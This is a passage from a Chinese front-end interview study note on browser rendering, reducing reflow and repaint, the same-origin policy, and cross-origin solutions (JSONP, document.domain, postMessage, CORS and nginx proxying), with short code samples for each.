文件下载和 CSS 文件下载是并行的。</p></li></ul><p><strong>JS：</strong></p><p>由于 JavaScript 可操纵 DOM ，如果在修改这些元素属性同时渲染界面（即 JavaScript 线程和 UI 线程同时运行），那么渲染线程前后获得的元素数据就可能不一致。因此浏览器设置 <strong>GUI 渲染线程与 JS 引擎为互斥的关系</strong>。</p><ul><li>当 JavaScript 引擎执行时，GUI 线程会被挂起。GUI 更新被保存在一个队列中，等到引擎线程空闲时立即执行。</li></ul><p>因此如果 JS 执行时间过长就会造成页面的渲染不连贯，导致页面渲染加载阻塞。</p><h2 id="页面渲染优化"><a href="#页面渲染优化" class="headerlink" title="页面渲染优化"></a>页面渲染优化</h2><p>参考自<a href="https://juejin.cn/post/6844904134307495943">https://juejin.cn/post/6844904134307495943</a></p><ul><li>HTML文档结构层次尽量少，保证层级扁平</li><li>JS 脚本尽量后放</li><li>样式结构层次尽量简单</li><li>少量首屏样式使用内联方式放在标签内</li><li>在脚本中尽量减少 DOM 操作，尽量访问离线 DOM 样式信息，避免过度触发回流</li><li>减少通过 JS 代码修改元素样式，尽量使用修改 class 名方式操作样式或动画</li><li>尽量减少浏览器重排和重绘</li><li>不要使用 <code>table</code> 布局</li><li>CSS 动画中尽量只使用 <code>transform</code> 和 <code>opacity</code> ，不会发生重排和重绘</li><li>隐藏在屏幕外，或在页面滚动时，尽量停止动画</li><li>尽可能只使用 CSS 做动画，CSS动画肯定比 JS 动画要好很多</li><li>避免浏览器的隐式合成</li><li>改变复合层的尺寸</li></ul><h2 id="为什么-JS-操作-DOM-慢？"><a href="#为什么-JS-操作-DOM-慢？" class="headerlink" title="为什么 JS 操作 DOM 慢？"></a>为什么 JS 操作 DOM 慢？</h2><p>DOM 属于<strong>渲染引擎</strong>的东西，而 JS 又属于 <strong>JS 引擎</strong>。当通过 JS 操作 DOM 时，涉及两个线程之间的通信，会带来性能上的损耗。操作 DOM 次数一多，就等同于一直在进行<strong>线程之间的通信</strong>，并且还可能造成来<strong>重绘回流</strong>，影响性能。</p><h2 id="重绘（Repaint）和回流（重排）（Reflow）（高频）"><a href="#重绘（Repaint）和回流（重排）（Reflow）（高频）" class="headerlink" title="重绘（Repaint）和回流（重排）（Reflow）（高频）"></a>重绘（Repaint）和回流（重排）（Reflow）（高频）</h2><p>重绘和回流会在设置节点样式时频繁出现，同时也会很大程度上影响性能。</p><ul><li>重绘：<strong>当节点需要更改外观而不影响布局</strong>，比如改变 color </li><li>回流：<strong>布局或者几何属性需要改变</strong></li></ul><p><strong>回流必定会发生重绘，重绘不一定会引发回流</strong>。回流所需的成本比重绘高的多，改变父节点里的子节点很可能会导致父节点的一系列回流。以下几个动作可能会导致回流：</p><ul><li>浏览器窗口尺寸改变</li><li>元素尺寸改变</li><li>添加或删除可见的 DOM 元素</li><li>内容变化，比如在 input 框中输入文字</li><li>定位或者浮动</li><li>计算 offsetTop、offsetLeft 等布局信息</li><li>激活 CSS 伪类，例如 :hover</li><li>设置 style 属性的值</li><li>盒模型</li></ul><h3 id="减少重绘和回流？"><a href="#减少重绘和回流？" class="headerlink" title="减少重绘和回流？"></a>减少重绘和回流？</h3><p>部分参考自 <a href="https://juejin.cn/post/6844904083212468238#heading-15">https://juejin.cn/post/6844904083212468238#heading-15</a></p><p>减少重排范围：尽量以局部布局的形式组织 html 结构，尽可能小的影响重排的范围。</p><ul><li><strong>不要使用 <code>table</code> 布局</strong>，因为很小的一个改动就会造成整个 <code>table</code> 的重新布局。通常可用 ul、li、span 等标签取代 table。</li><li>尽可能在低层级的 DOM 节点上改变样式。</li></ul><p>减少重排次数：</p><ul><li><p>使用 <code>transform</code> 替代 <code>top</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引起回流</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;.test&#x27;</span>).style.top = <span class="string">&#x27;100px&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>使用 <code>visibility:hidden</code> 替换 <code>display: none</code> ，前者只会引起重绘，后者会引发回流（改变了布局）</p></li><li><p>不要把节点的属性值放在一个循环里当成循环里的变量</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// 获取 offsetTop 会导致回流，因为需要去获取正确的值</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.test&#x27;</span>).style.offsetTop)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>样式集中改变：</strong>对于静态页面，可以更改类名而不是修改样式。对于动态页面，统一在 cssText 变量中编辑。</p></li><li><p><strong>分离读写操作：</strong>DOM 的多个读操作（或多个写操作），应该放在一起。不要两个读操作之间，加入一个写操作（原来的操作会导致四次重排，读写分离之后实际上只触发了一次重排，这都得益于浏览器的[渲染队列机制](###用 clientTop 和 clinetLeft 为什么会导致浏览器重排？)）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad 强制刷新 触发四次重排+重绘</span></span><br><span class="line">div.style.left = div.offsetLeft + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.top = div.offsetTop + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.right = div.offsetRight + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.bottom = div.offsetBottom + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good 缓存布局信息 相当于读写分离 触发一次重排+重绘</span></span><br><span class="line"><span class="keyword">var</span> curLeft = div.offsetLeft;</span><br><span class="line"><span class="keyword">var</span> curTop = div.offsetTop;</span><br><span class="line"><span class="keyword">var</span> curRight = div.offsetRight;</span><br><span class="line"><span class="keyword">var</span> curBottom = div.offsetBottom;</span><br><span class="line"></span><br><span class="line">div.style.left = curLeft + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.top = curTop + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.right = curRight + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">div.style.bottom = curBottom + <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>优化动画</strong>：动画速度越快，回流次数越多，因此可以使用 <code>requestAnimationFrame</code> 作为动画帧。（浏览器刷新频率为60Hz，即每 16.6ms 更新一次，而 requestAnimationFrame() 正是以 16.6ms 的速度更新一次。）</p></li><li><p><strong>避免设置多层内联样式</strong>。浏览器的 CSS 解析器解析 css 文件时，规则是<strong>从右到左匹配</strong>查找，样式层级过多会影响重排重绘效率。</p></li><li><p>将频繁重绘或者回流的节点<strong>设置为图层</strong>。图层能够阻止该节点的渲染行为影响别的节点，比如对于 <code>video</code> 标签来说，浏览器会自动将该节点变为图层。设置节点为图层的方式：</p><ul><li><code>will-change</code> 属性</li><li><code>video</code>、<code>iframe</code> 标签</li></ul></li></ul><h3 id="如何获取某个-DOM-节点的位置？"><a href="#如何获取某个-DOM-节点的位置？" class="headerlink" title="*如何获取某个 DOM 节点的位置？"></a>*如何获取某个 DOM 节点的位置？</h3><p>获取布局信息的属性如下：</p><ul><li>offsetTop、offsetLeft、offsetWidth、offsetHeight</li><li>scrollTop、scrollLeft、scrollWidth、scrollHeight</li><li>clientTop、clientLeft、clientWidth、clientHeight</li><li>getComputedStyle()</li><li>getBoundingClientRect()</li></ul><h3 id="用-clientTop-和-clinetLeft-为什么会导致浏览器重排？"><a href="#用-clientTop-和-clinetLeft-为什么会导致浏览器重排？" class="headerlink" title="用 clientTop 和 clinetLeft 为什么会导致浏览器重排？"></a>用 clientTop 和 clinetLeft 为什么会导致浏览器重排？</h3><p><strong>由于每次重排都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化重排过程</strong>。浏览器会将修改操作放入到队列里，直到过一段时间或者操作达到阈值，才清空队列。但是，当获取布局信息的操作时，会<strong>强制清空队列</strong>。因为队列中可能会有影响到这些值的操作，为了给出最精确的值，浏览器会立即重排。</p><p>具体见<a href="https://www.chenhanpeng.com/reflow-and-repaint/">重绘重排全解</a>。</p><h1 id="跨域（高频）"><a href="#跨域（高频）" class="headerlink" title="跨域（高频）"></a>跨域（高频）</h1><h2 id="浏览器的同源政策"><a href="#浏览器的同源政策" class="headerlink" title="浏览器的同源政策"></a>浏览器的同源政策</h2><p>浏览器出于安全考虑，有同源策略。一个域下的 js 脚本在未经允许的情况下，不能够访问另一个域的内容。这里的同源指的是两个域的<strong>协议、域名、端口号</strong>必须相同，<strong>有一个不同就是跨域</strong>。</p><p><a href="https://a.baidu.com/">https://a.baidu.com</a> 和 <a href="https://b.baidu.com：不同域名（主域相同，子域不同），跨">https://b.baidu.com：不同域名（主域相同，子域不同），跨</a></p><p><a href="https://baidu.com/a">https://baidu.com/a</a> 和 <a href="https://baidu.com/b%EF%BC%9A%E5%90%8C%E4%B8%80%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%B8%8D%E5%90%8C%E6%96%87%E4%BB%B6%E6%88%96%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%B8%8D%E8%B7%A8">https://baidu.com/b：同一域名，不同文件或路径，不跨</a></p><p>同源政策主要限制三个方面：</p><ul><li><p>当前域下的 js 脚本不能够访问其他域下的 cookie、localStorage 和 indexDB。</p></li><li><p>当前域下的 js 脚本不能够操作或访问其他域下的 DOM。</p></li><li><p>当前域下 ajax 无法发送跨域请求。</p></li></ul><h3 id="为什么引入这种机制？"><a href="#为什么引入这种机制？" class="headerlink" title="为什么引入这种机制？"></a><strong>为什么引入这种机制？</strong></h3><p>主要用来防止 CSRF 攻击。CSRF 攻击是利用用户的登录态发起恶意请求。在没有同源策略的情况下，A 网站可以被任意其他来源的 Ajax 访问到内容。如果当前 A 网站还存在登录态，那么对方就可以通过 Ajax 获得用户的任何信息。</p><p>同源政策主要是为了保证用户的信息安全，它只是对 js 脚本的一种限制，并不是对浏览器的限制，对于一般的 img、或者script 脚本请求都不会有跨域的限制。</p><h2 id="如何解决跨域？"><a href="#如何解决跨域？" class="headerlink" title="如何解决跨域？"></a>如何解决跨域？</h2><p>参考自 <a href="https://segmentfault.com/a/1190000011145364">https://segmentfault.com/a/1190000011145364</a></p><h3 id="一、JSONP"><a href="#一、JSONP" class="headerlink" title="一、JSONP"></a>一、JSONP</h3><p>部分参考自 <a href="https://segmentfault.com/a/1190000008445998">https://segmentfault.com/a/1190000008445998</a></p><p>通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上，再通过相应的标签从不同域名下加载静态资源。基于此，可以动态创建script，再请求一个带参网址实现跨域通信。</p><p><strong>原理：利用 <code>&lt;script&gt;</code> 标签没有同源策略限制</strong>。通过动态构建  <code>&lt;script&gt; </code> 标签，在请求的 url 后指定一个回调函数 <code>handleCallback</code> ，后端解析到后加上需要传的数据再返回，前端接收到返回数据后直接执行，调用定义好的回调函数，实现跨域请求的处理。</p><p>优点：兼容性好，IE 低版本不能使用 CORS 但可以使用 JSONP。</p><p><strong>缺点</strong>：JSONP 只能实现 <code>get</code> 请求。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 回调执行函数</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">showJsonp</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(obj.message);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> url = <span class="string">&#x27;http://127.0.0.1:8787/?func=showJsonp&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数</span></span></span><br><span class="line"><span class="javascript">    script.setAttribute(<span class="string">&#x27;src&#x27;</span>, url);</span></span><br><span class="line"><span class="javascript">    script.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>].appendChild(script);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>后台代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;*&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> callback = req.query.func;</span><br><span class="line">  <span class="keyword">let</span> content = callback+<span class="string">&quot;(&#123;&#x27;message&#x27;:&#x27;测试数据2&#x27;&#125;)&quot;</span>;</span><br><span class="line">  res.send(content);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 后台根据请求构造出的数据如下（返回时即执行全局函数）：</span></span><br><span class="line">showJsonp(&#123;<span class="string">&#x27;message&#x27;</span>:<span class="string">&#x27;测试数据2&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="二、document-domain-iframe"><a href="#二、document-domain-iframe" class="headerlink" title="二、document.domain + iframe"></a>二、document.domain + iframe</h3><p>此方案仅限主域相同，子域不同的跨域应用场景（比如 <code>a.test.com</code> 和 <code>b.test.com</code> ）</p><p><strong>实现原理：</strong>两个页面都通过 js 强制设置 document.domain 为基础主域（<code>document.domain = &#39;test.com&#39;</code>），就实现了同域。</p><ol><li><p>父窗口：(<a href="https://link.segmentfault.com/?enc=QTxtg4sAjsr3h5wz1dA4qA==.kajf9EO7b8bSC2Fio2L6eeugK+KQTJiP/2pe6TdFqXQ=">http://www.domain.com/a.html)</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://child.domain.com/b.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;domain.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> user = <span class="string">&#x27;admin&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>子窗口：(<a href="https://link.segmentfault.com/?enc=nEAJElNDst4eWHQ5h++4eg==.gGev6WApEnBZcOrk799egtrDPM5JJ0PZUAPL53hnyzE=">http://child.domain.com/b.html)</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;domain.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取父窗口中变量</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;get js data from parent ---&gt; &#x27;</span> + <span class="built_in">window</span>.parent.user);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="三、postMessage"><a href="#三、postMessage" class="headerlink" title="三、postMessage"></a>三、postMessage</h3><p>H5 新增。通常用于获取嵌入页面中的第三方页面数据：一个页面发送消息，另一个页面判断来源并接收消息。postMessage(data,origin)方法接受两个参数。</p><ol><li><p>a.html：(<a href="https://link.segmentfault.com/?enc=5uNwoh3fieYbgK7Lft4h8w==.p/cljpA1KaxGCadLZr6WqYGAwXBJef6Imxq2eUfZmqc=">http://www.domain1.com/a.html)</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.domain2.com/b.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;aym&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 向domain2传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">&#x27;http://www.domain2.com&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接受domain2返回数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;data from domain2 ---&gt; &#x27;</span> + e.data);</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>b.html：(<a href="https://link.segmentfault.com/?enc=VQCtTj5K0kZQtyO/bU8jBw==.+/Evv1jtgt8weDGKDgDYReGgSDp9zbpSuE7wtSTbMpQ=">http://www.domain2.com/b.html)</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接收domain1的数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;data from domain1 ---&gt; &#x27;</span> + e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line"><span class="javascript">            data.number = <span class="number">16</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 处理后再发回domain1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">&#x27;http://www.domain1.com&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="四、跨域资源共享（CORS）"><a href="#四、跨域资源共享（CORS）" class="headerlink" title="四、跨域资源共享（CORS）"></a>四、跨域资源共享（CORS）</h3><ul><li>普通跨域请求：只服务端设置Access-Control-Allow-Origin即可，前端无须设置</li><li>带cookie请求：前后端都需要设置。</li></ul><p>CORS也已经成为主流的跨域解决方案。具体见 <a href="https://segmentfault.com/a/1190000017135064">跨域资源共享——CORS</a>。</p><p><strong>1、 前端设置：</strong></p><ul><li><p>原生 ajax</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;http://www.domain2.com:8080/login&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.send(<span class="string">&#x27;user=admin&#x27;</span>);</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>vue</p><ul><li>axios 设置：<code>axios.defaults.withCredentials = true</code></li><li>vue-resource 设置：<code>Vue.http.options.credentials = true</code></li></ul></li></ul><p><strong>2、 服务端设置</strong></p><h4 id="CORS-的-response-头部字段是什么"><a href="#CORS-的-response-头部字段是什么" class="headerlink" title="CORS 的 response 头部字段是什么"></a>CORS 的 response 头部字段是什么</h4><p>跨域请求，CORS要求服务端设置一些头部字段，最重要的一个就是 <code>Access-Control-Allow-Origin</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Client http://localhost:8080</span></span><br><span class="line"><span class="function"><span class="title">simpleRequest</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  axios(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/api/simple&#x27;</span></span><br><span class="line">  &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Server http://localhost:3000</span></span><br><span class="line">app.use(cors());</span><br><span class="line">router.get(<span class="string">&#x27;/api/simple&#x27;</span>, <span class="function"><span class="params">ctx</span> =&gt;</span> &#123;</span><br><span class="line">  ctx.body = &#123; <span class="attr">result</span>: <span class="string">&#x27;simple request success&#x27;</span> &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/vp7j1JySKXs4Yx9.png" alt="image.png"></p><p><strong>HTTP 报文：</strong></p><p><img src="https://i.loli.net/2021/10/16/9yMSPeWIKB5YxLv.png" alt="image.png"></p><p>HTTP 请求头部有个 <code>Origin</code> 字段，表示请求来自哪里。HTTP 响应头部中的 <code>Access-Control-Allow-Origin</code> 表示哪个域可以访问该资源。使用 <code>Origin</code> 和 <code>Access-Control-Allow-Origin</code> 就完成了最简单的访问控制。</p><h4 id="跨域能携带-Cookie-吗？"><a href="#跨域能携带-Cookie-吗？" class="headerlink" title="跨域能携带 Cookie 吗？"></a>跨域能携带 Cookie 吗？</h4><p><a href="https://juejin.cn/post/6999262693715050533">https://juejin.cn/post/6999262693715050533</a></p><p>除了withCrenditial还需要在header做什么处理才能携带cookie？</p><h4 id="简单请求和非简单（复杂）请求"><a href="#简单请求和非简单（复杂）请求" class="headerlink" title="简单请求和非简单（复杂）请求"></a>简单请求和非简单（复杂）请求</h4><p>部分参考自<a href="https://juejin.cn/post/6976817041625841701">https://juejin.cn/post/6976817041625841701</a></p><p>浏览器将 ajax 请求分为<code>简单请求</code>和<code>非简单请求</code>。同时满足以下两个条件，就是简单请求：</p><ul><li>请求方法是 HEAD、GET、POST 三种方法之一</li><li>HTTP的头信息不超出以下几种字段：<ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Last-Event-ID</li><li>Content-Type：只限于三个值 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code><ul><li>application/x-www-form-urlencoded: 表示使用URL编码的方式来编码表单。如果没有将enctype属性设置为任何值，那么这就是<strong>默认值</strong>。</li><li>multipart/form-data: 当用户想<strong>上传文件</strong>这种<strong>二进制等文件</strong>或者前面的那个方式不能满足时，使用这种类型的表单</li><li>text/plain: <strong>文本形式</strong>，只发送数据而不进行任何编码时使用</li></ul></li></ul></li></ul><p><strong>简单请求的处理:</strong></p><ul><li>对于简单请求，浏览器直接发出 CORS 请求。会在头信息中增加 Origin 字段，用来说明本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</li></ul><ul><li><p>如果 Origin 指定的源不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现回应的头信息没有包含 Access-Control-Allow-Origin 字段，就知道出错了，从而抛出一个错误，ajax 不会收到响应信息。</p></li><li><p>如果成功就会包含一些以 Access-Control- 开头的字段。</p></li></ul><p><strong>非简单请求的处理：</strong></p><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p><ul><li>非简单请求会在正式通信之前，增加一次HTTP查询请求，称为<strong>预检请求</strong>，来判断该域名是否在服务器的白名单中，如果收到肯定回复后才会发起正式的XMLHttpRequest请求，否则就报错。</li><li>**”预检”请求用的请求方法是<code>OPTIONS</code>**，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</li><li>如果服务器否定了”预检”请求，会返回一个<strong>正常的HTTP回应</strong>，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。</li><li>一旦服务器通过了”预检”请求，以后每次浏览器正常的<code>CORS</code>请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一<code>个Access-Control-Allow-Origin</code>头信息字段。</li></ul><h3 id="五、nginx-代理"><a href="#五、nginx-代理" class="headerlink" title="五、nginx 代理"></a>五、nginx 代理</h3><p>（读法：engine X）</p><p><img src="https://i.loli.net/2021/10/14/afCSliZJ53EDxVQ.png" alt="image.png"></p><p>Nginx 是一种高性能的反向代理服务器，可以用来轻松解决跨域问题。</p><ul><li>正向代理帮助客户端访问客户端自己访问不到的服务器，然后将结果返回给客户端。（服务器是帮客户端做事情）</li><li>反向代理拿到客户端的请求，将请求转发给其他的服务器，主要的场景是<strong>维持服务器集群的负载均衡</strong>，即：反向代理帮其它的服务器拿到请求，然后选择一个合适的服务器，将请求转交给它。（服务器是帮其它的服务器做事情）</li></ul><p><strong>1、 nginx 配置解决 iconfont 跨域：</strong> 浏览器跨域访问 js、css、img 等常规静态资源被同源策略许可，但 iconfont字体文件例外，此时可在 nginx 的静态资源服务器中加入以下配置。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、 nginx 反向代理接口跨域</strong>：实现思路：通过 nginx 配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，这个跳板机的域名也是 domain1.com。然后让客户端首先访问 domain1.com/api，这当然没有跨域，然后 Nginx 服务器作为反向代理，将请求转发给 domain2.com:8080。（并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录）具体配置：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#proxy服务器</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">81</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  www.domain1.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://www.domain2.com:8080;  <span class="comment">#反向代理</span></span><br><span class="line">        <span class="attribute">proxy_cookie_domain</span> www.domain2.com www.domain1.com; <span class="comment">#修改cookie里域名</span></span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h4><p><strong>正向代理</strong>：即常说的代理。正向代理隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求。</p><p><strong>反向代理</strong>：隐藏了真实的服务端，当我们向一个网站发起请求的时候，背后可能有成千上万台服务器为我们服务。反向代理服务器会帮我们把请求转发到真实的服务器，反向代理服务器一般用来实现<strong>负载平衡</strong>。</p><h4 id="负载平衡的两种实现方式？"><a href="#负载平衡的两种实现方式？" class="headerlink" title="负载平衡的两种实现方式？"></a>负载平衡的两种实现方式？</h4><ol><li><p>反向代理：用户的请求都发送到反向代理服务上，然后由反向代理服务器来转发请求到真实的服务器上，以此来实现集群的负载平衡。</p></li><li><p>DNS ：DNS 